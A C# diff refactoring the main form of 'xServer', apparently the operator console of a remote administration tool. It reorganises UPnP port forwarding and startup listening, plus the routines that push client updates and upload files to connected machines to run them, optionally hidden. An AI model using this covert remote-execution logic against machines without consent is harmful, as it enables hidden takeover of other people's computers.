@@ -5,13 +5,12 @@ using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
 using xServer.Core.Commands;
-using xServer.Core.Extensions;
+using xServer.Enums;
 using xServer.Core.Helper;
-using xServer.Core.Misc;
 using xServer.Core.Networking;
+using xServer.Core.Networking.Utilities;
+using xServer.Core.Utilities;
 using xServer.Settings;
-using UserStatus = xServer.Core.Commands.CommandHandler.UserStatus;
-using ShutdownAction = xServer.Core.Commands.CommandHandler.ShutdownAction;
 
 namespace xServer.Forms
 {
@@ -75,9 +74,6 @@ namespace xServer.Forms
 
             _lvwColumnSorter = new ListViewColumnSorter();
             lstClients.ListViewItemSorter = _lvwColumnSorter;
-
-            lstClients.RemoveDots();
-            lstClients.ChangeTheme();
         }
 
         public void UpdateWindowTitle()
@@ -109,15 +105,21 @@ namespace xServer.Forms
             ConServer.ClientDisconnected += ClientDisconnected;
         }
 
-        private void FrmMain_Load(object sender, EventArgs e)
+        private void AutostartListeningP()
         {
-            InitializeServer();
-
-            if (XMLSettings.AutoListen)
+            if (XMLSettings.AutoListen && XMLSettings.UseUPnP)
             {
-                if (XMLSettings.UseUPnP)
-                    UPnP.ForwardPort(ushort.Parse(XMLSettings.ListenPort.ToString()));
+                UPnP.Initialize(XMLSettings.ListenPort);
                 ConServer.Listen(XMLSettings.ListenPort);
+            }
+            else if (XMLSettings.AutoListen)
+            {
+                UPnP.Initialize();
+                ConServer.Listen(XMLSettings.ListenPort);
+            }
+            else
+            {
+                UPnP.Initialize();
             }
 
             if (XMLSettings.IntegrateNoIP)
@@ -126,13 +128,16 @@ namespace xServer.Forms
             }
         }
 
+        private void FrmMain_Load(object sender, EventArgs e)
+        {
+            InitializeServer();
+            AutostartListeningP();
+        }
+
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
         {
             ConServer.Disconnect();
-
-            if (UPnP.IsPortForwarded)
-                UPnP.RemovePort();
-
+            UPnP.DeletePortMap(XMLSettings.ListenPort);
             nIcon.Visible = false;
             nIcon.Dispose();
             Instance = null;
@@ -164,12 +169,6 @@ namespace xServer.Forms
 
         private void ClientDisconnected(Client client)
         {
-            if (client.Value != null)
-            {
-                client.Value.DisposeForms();
-                client.Value = null;
-            }
-
             RemoveClientFromListview(client);
         }
 
@@ -390,11 +389,11 @@ namespace xServer.Forms
                 {
                     if (frm.ShowDialog() == DialogResult.OK)
                     {
-                        if (Core.Misc.Update.UseDownload)
+                        if (Core.Utilities.Update.UseDownload)
                         {
                             foreach (Client c in GetSelectedClients())
                             {
-                                new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Misc.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
+                                new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Utilities.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
                             }
                         }
                         else
@@ -407,8 +406,8 @@ namespace xServer.Forms
                                     if (c == null) continue;
                                     if (error) continue;
 
-                                    FileSplit srcFile = new FileSplit(Core.Misc.Update.UploadPath);
-                                    var fileName = Helper.GetRandomFilename(8, ".exe");
+                                    FileSplit srcFile = new FileSplit(Core.Utilities.Update.UploadPath);
+                                    var fileName = FileHelper.GetRandomFilename(8, ".exe");
                                     if (srcFile.MaxBlocks < 0)
                                     {
                                         MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
@@ -417,7 +416,7 @@ namespace xServer.Forms
                                         break;
                                     }
 
-                                    int ID = new Random().Next(0, int.MaxValue);
+                                    int id = FileHelper.GetNewTransferId();
 
                                     CommandHandler.HandleSetStatus(c,
                                         new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
@@ -432,7 +431,7 @@ namespace xServer.Forms
                                             error = true;
                                             break;
                                         }
-                                        new Core.Packets.ServerPackets.DoClientUpdate(ID, string.Empty, fileName, block, srcFile.MaxBlocks, currentBlock).Execute(c);
+                                        new Core.Packets.ServerPackets.DoClientUpdate(id, string.Empty, fileName, block, srcFile.MaxBlocks, currentBlock).Execute(c);
                                     }
                                 }
                             }).Start();
@@ -659,7 +658,7 @@ namespace xServer.Forms
                                     break;
                                 }
 
-                                int ID = new Random().Next(0, int.MaxValue);
+                                int id = FileHelper.GetNewTransferId();
 
                                 CommandHandler.HandleSetStatus(c,
                                     new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
@@ -667,16 +666,19 @@ namespace xServer.Forms
                                 for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                 {
                                     byte[] block;
-                                    if (!srcFile.ReadBlock(currentBlock, out block))
+                                    if (srcFile.ReadBlock(currentBlock, out block))
+                                    {
+                                        new Core.Packets.ServerPackets.DoUploadAndExecute(id,
+                                            Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
+                                            currentBlock, UploadAndExecute.RunHidden).Execute(c);
+                                    }
+                                    else
                                     {
                                         MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                             "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                         error = true;
                                         break;
                                     }
-                                    new Core.Packets.ServerPackets.DoUploadAndExecute(ID,
-                                        Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
-                                        currentBlock, UploadAndExecute.RunHidden).Execute(c);
                                 }
                             }
                         }).Start();
